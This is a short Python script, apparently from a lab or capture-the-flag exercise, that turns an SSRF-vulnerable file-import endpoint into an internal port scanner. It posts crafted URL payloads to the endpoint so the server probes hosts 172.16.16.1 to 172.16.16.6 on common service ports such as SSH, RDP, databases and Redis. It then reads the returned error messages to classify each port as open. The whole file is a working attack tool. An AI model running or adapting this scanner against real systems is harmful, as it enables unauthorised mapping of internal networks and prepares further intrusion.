#!/usr/bin/env python3


"""
Usage:
python3 liveIP_port_scan.py -t http://apigateway:8000/files/import --timeout 5
"""


import argparse
import requests

# Define common ports to check
COMMON_PORTS = [
    22, 80, 443, 1433, 1521, 3306, 3389, 5000,
    5432, 5900, 6379, 8000, 8001, 8055, 8080, 8443, 9000
]

# Argument parsing
parser = argparse.ArgumentParser(description="SSRF-based port scanner for 172.16.16.x subnet.")
parser.add_argument('-t', '--target', help='Host/IP of the SSRF-vulnerable service', required=True)
parser.add_argument('--timeout', help='Request timeout in seconds (default: 3)', type=int, default=3)
parser.add_argument('-v', '--verbose', help='Enable verbose output', action='store_true')
args = parser.parse_args()

# Configuration
base_url = args.target
timeout = args.timeout
ip_template = "http://172.16.16.{octet}"

# Scan range: 172.16.16.1 through 172.16.16.6
for octet in range(1, 7):
    host = ip_template.format(octet=octet)
    display_host = host.replace("http://", "")
    print(f"Trying host: {display_host}")

    for port in COMMON_PORTS:
        full_url = f"{host}:{port}"
        try:
            payload = {"url": full_url}
            response = requests.post(url=base_url, json=payload, timeout=timeout)
            text = response.text

            if args.verbose:
                print(f"\t{port}\tVERBOSE: {text.strip()}")

            if "status code 404" in text:
                print(f"\t{port}\tOPEN - returned 404")
            elif "You don't have permission to access this." in text:
                print(f"\t{port}\tOPEN - permission denied (valid resource)")
            elif "Parse Error:" in text:
                print(f"\t{port}\tPOTENTIALLY OPEN - parse error, possibly non-HTTP")
            elif "socket hang up" in text:
                print(f"\t{port}\tOPEN - socket hang up, likely non-HTTP")
            # You can uncomment the next block if ECONNREFUSED is common
            # elif "ECONNREFUSED" in text:
            #     print(f"\t{port}\tREFUSED - connection refused, likely live host")
            else:
                if args.verbose:
                    print(f"\t{port}\tUNKNOWN RESPONSE: {text.strip()[:100]}")

        except requests.exceptions.Timeout:
            print(f"\t{port}\tTIMED OUT")
        except requests.exceptions.RequestException as e:
            print(f"\t{port}\tERROR: {e}")
